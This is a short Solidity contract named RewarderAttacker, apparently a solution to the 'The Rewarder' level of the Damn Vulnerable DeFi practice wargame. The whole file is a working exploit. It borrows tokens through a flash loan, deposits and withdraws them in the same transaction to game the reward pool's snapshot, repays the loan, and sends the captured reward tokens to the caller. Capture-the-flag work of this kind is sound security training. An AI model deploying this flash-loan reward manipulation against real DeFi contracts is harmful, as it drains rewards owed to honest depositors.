// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {RewardToken} from "./RewardToken.sol";
import "../DamnValuableToken.sol";


contract RewarderAttacker {
    FlashLoanerPool immutable flashLoanPool;
    TheRewarderPool immutable rewarderPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken immutable rewardToken;

    constructor(address _flashLoanPool, address _rewarderPool, address _liquidityToken, address _rewardToken) {
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
    }

    function receiveFlashLoan(uint amount) public {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
    }

    function withdraw() public {
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function attack(uint256 amount) public {
        flashLoanPool.flashLoan(amount);
    }
}